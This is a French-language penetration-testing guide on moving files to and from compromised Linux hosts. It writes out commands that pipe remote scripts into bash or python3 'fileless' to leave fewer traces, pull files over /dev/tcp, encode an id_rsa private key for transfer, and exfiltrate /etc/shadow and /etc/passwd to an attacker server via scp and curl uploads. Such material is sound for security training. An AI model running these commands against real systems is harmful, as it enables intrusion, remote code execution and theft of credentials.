# Transferts de fichiers sous Linux

## Pourquoi

La plupart des serveurs et infrastructures reseau tournent sous Linux. Quand on compromet un systeme Linux, il faut pouvoir y deposer des outils d'enumeration ou d'escalade, et en extraire des donnees sensibles. Linux offre un ecosysteme riche en outils de transfert, souvent preinstalles, ce qui simplifie les choses par rapport a Windows.

## Comment ca marche

### Encodage Base64 (sans reseau)

Quand la taille du fichier le permet et qu'on dispose d'un terminal, le base64 reste la methode la plus simple. Aucune connexion reseau n'est necessaire.

**Encoder et verifier sur la machine source :**

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

**Decoder sur la cible :**

```bash
echo -n '<CHAINE_BASE64>' | base64 -d > id_rsa
md5sum id_rsa
```

La verification du hash MD5 confirme que le fichier n'a pas ete altere pendant le transfert.

{% hint style="warning" %}
Cette methode ne convient pas aux fichiers volumineux. Au-dela de quelques Ko, le copier-coller de la chaine base64 devient penible et source d'erreurs.
{% endhint %}

### Telechargement HTTP avec wget et curl

Les deux outils les plus repandus sous Linux pour interagir avec des ressources web. Ils sont presents sur la quasi-totalite des distributions.

{% tabs %}
{% tab title="wget" %}
```bash
wget http://<IP_CIBLE>:8080/linpeas.sh -O /tmp/linpeas.sh
```
{% endtab %}
{% tab title="curl" %}
```bash
curl -o /tmp/linpeas.sh http://<IP_CIBLE>:8080/linpeas.sh
```
{% endtab %}
{% endtabs %}

**Serveur HTTP cote attaquant (Exegol) :**

```bash
python3 -m http.server 8080
```

### Execution fileless (sans fichier sur disque)

Linux permet, grace aux pipes, d'executer un script directement sans l'ecrire sur le systeme de fichiers. C'est utile pour limiter les traces.

{% tabs %}
{% tab title="curl + bash" %}
```bash
curl http://<IP_CIBLE>:8080/linpeas.sh | bash
```
{% endtab %}
{% tab title="wget + python" %}
```bash
wget -qO- http://<IP_CIBLE>:8080/script.py | python3
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Meme en mode fileless, certains scripts peuvent creer des fichiers temporaires pendant leur execution. Ce n'est pas un transfert 100% invisible.
{% endhint %}

### Telechargement via /dev/tcp (Bash)

Si ni `wget` ni `curl` ne sont disponibles, et que Bash est compile avec le support des redirections reseau (`--enable-net-redirections`), on peut utiliser le pseudo-fichier `/dev/tcp`.

```bash
exec 3<>/dev/tcp/<IP_CIBLE>/80
echo -e "GET /linpeas.sh HTTP/1.1\n\n" >&3
cat <&3 > /tmp/linpeas.sh
```

C'est une requete HTTP brute. Le fichier recupere contient les en-tetes HTTP qu'il faut eventuellement nettoyer.

### Transfert securise via SSH/SCP

SCP (Secure Copy) utilise SSH pour des transferts chiffres. C'est la methode la plus sure quand un acces SSH est disponible.

**De l'attaquant vers la cible :**

```bash
scp /chemin/outil.sh user@<IP_CIBLE>:/tmp/outil.sh
```

**De la cible vers l'attaquant :**

```bash
scp user@<IP_CIBLE>:/etc/shadow /tmp/shadow_cible
```

**Activer SSH si necessaire :**

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt | grep ssh
```

## En pratique

### Scenario classique : serveur HTTP Python

La methode la plus courante en mission :

1. Sur Exegol, placer les outils dans un repertoire dedie et demarrer un serveur HTTP :

```bash
mkdir /tmp/transfert && cp linpeas.sh /tmp/transfert/
cd /tmp/transfert && python3 -m http.server 8080
```

2. Sur la cible, telecharger avec wget ou curl :

```bash
wget http://<IP_CIBLE>:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

### Upload depuis la cible

**Via curl et uploadserver :**

Cote attaquant :

```bash
python3 -m uploadserver 8080
```

Cote cible :

```bash
curl -F 'files=@/etc/passwd' http://<IP_CIBLE>:8080/upload
```

**Via SCP (si SSH est disponible) :**

```bash
scp /etc/passwd user@<IP_CIBLE>:/tmp/passwd_exfil
```

## Pieges et galeres

- `wget` et `curl` ne sont pas toujours presents, notamment sur les conteneurs Docker minimalistes ou certains systemes embarques. Il faut alors se rabattre sur `/dev/tcp`, Python ou Perl.
- `/dev/tcp` n'est pas disponible dans tous les shells. Il faut explicitement utiliser `bash`, pas `sh` ou `dash`.
- SCP est parfois desactive meme quand SSH est actif. Verifier la configuration `sshd_config`.
- Le trafic HTTP en clair est visible pour tout IDS sur le reseau. Pour les fichiers sensibles, privilegier HTTPS ou SCP.

## Retour terrain

En pratique, le combo `python3 -m http.server` + `wget` couvre 80% des besoins de transfert vers des cibles Linux. C'est rapide a mettre en place, et les deux outils sont presque toujours disponibles. Pour les situations plus contraintes (pas de wget/curl, pas de connectivite directe), le base64 ou `/dev/tcp` prennent le relais.

## Memo express

| Methode | Commande rapide |
|---|---|
| Serveur HTTP | `python3 -m http.server 8080` |
| wget | `wget http://IP:PORT/fichier -O /tmp/fichier` |
| curl | `curl -o /tmp/fichier http://IP:PORT/fichier` |
| Fileless (curl) | `curl http://IP:PORT/script.sh \| bash` |
| Base64 | `cat fichier \| base64 -w 0` / `echo -n 'B64' \| base64 -d > fichier` |
| /dev/tcp | `exec 3<>/dev/tcp/IP/PORT` + `cat <&3` |
| SCP | `scp fichier user@IP:/chemin/` |
| Upload | `curl -F 'files=@/chemin' http://IP:8080/upload` |

***
